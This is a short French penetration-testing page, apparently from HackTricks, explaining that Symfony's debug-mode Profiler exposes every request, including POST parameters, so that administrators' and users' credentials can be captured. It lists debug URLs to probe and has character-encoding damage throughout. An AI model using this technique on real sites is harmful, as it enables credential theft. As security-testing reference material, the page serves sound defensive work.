Cette fonctionnalit√© s'appelle Symfony Profiler, et il n'y a pas beaucoup d'informations √† ce sujet sur internet. L'intention de cette fonctionnalit√© est tr√®s claire ; elle vous aide √† d√©boguer en cas d'erreur ou de bogue. Bien s√ªr, cette fonctionnalit√© ne peut √™tre utilis√©e que lorsque le mode d√©bogage est activ√©.

Le framework Symfony en lui-m√™me est tr√®s s√©curis√©, mais l'activation du mode d√©bogage rendra ce framework extr√™mement vuln√©rable. Par exemple, Profiler a une fonctionnalit√© appel√©e Recherche de Profil, comme le montre la capture d'√©cran suivante.

![f:id:flattsecurity:20201021204624p:plain](https://cdn-ak.f.st-hatena.com/images/fotolife/f/flattsecurity/20201021/20201021204624.png)

Comme vous pouvez le voir dans la capture d'√©cran ci-dessus, vous pouvez acc√©der √† toutes les requ√™tes envoy√©es au serveur. En cliquant sur les hachages dans le jeton, vous verrez que tous les param√®tres POST peuvent √™tre lus, comme on le voit dans la capture d'√©cran suivante. Avec cette fonctionnalit√©, nous pouvons d√©tourner les identifiants des comptes administrateurs et utilisateurs.

![f:id:flattsecurity:20201021204637p:plain](https://cdn-ak.f.st-hatena.com/images/fotolife/f/flattsecurity/20201021/20201021204637.png)

### Autres points de terminaison activ√©s pour le d√©bogage

Vous devriez √©galement v√©rifier ces URL :

* **https://example.com/app\_dev.php/\_profiler**
* **https://example.com/app\_dev.php**\\

## R√©f√©rences

* [**https://www.ambionics.io/blog/symfony-secret-fragment**](https://www.ambionics.io/blog/symfony-secret-fragment)
* [**https://flattsecurity.hatenablog.com/entry/2020/11/02/124807**](https://flattsecurity.hatenablog.com/entry/2020/11/02/124807)
* [**https://infosecwriteups.com/how-i-was-able-to-find-multiple-vulnerabilities-of-a-symfony-web-framework-web-application-2b82cd5de144**](https://infosecwriteups.com/how-i-was-able-to-find-multiple-vulnerabilities-of-a-symfony-web-framework-web-application-2b82cd5de144)

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
```
